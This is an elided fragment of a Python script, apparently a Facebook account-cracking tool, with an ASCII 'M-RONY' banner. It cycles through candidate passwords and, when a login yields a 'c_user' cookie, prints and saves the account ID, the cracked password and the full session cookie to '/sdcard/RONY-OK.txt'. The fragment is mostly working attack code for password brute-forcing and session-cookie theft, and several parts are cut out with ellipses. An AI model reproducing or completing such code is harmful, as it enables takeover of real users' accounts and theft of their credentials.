...
logo =("""                                                
\x1b[38;5;46m                                   ,...             
\x1b[38;5;46m`7MMM.     ,MMF'   `7MM"""Mq.   .g8""8q. `7MN.   `7MF'`YMM'   `MM'
  MMMb    dPMM       MM   `MM..dP'    `YM. MMN.    M    VMA   ,V  
  M YM   ,M MM       MM   ,M9 dM'      `MM M YMb   M     VMA ,V   
  M  Mb  M' MM       MMmmdM9  MM        MM M  `MN. M      VMMP    
  M  YM.P'  MM mmmmm MM  YM.  MM.      ,MP M   `MM.M       MM     
  M  `YM'   MM       MM   `Mb.`Mb.    ,dP' M     YMM       MM     
.JML. `'  .JMML.   .JMML. .JMM. `"bmmd"' .JML.    YM     .JMML.   
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[RONY-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/RONY-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
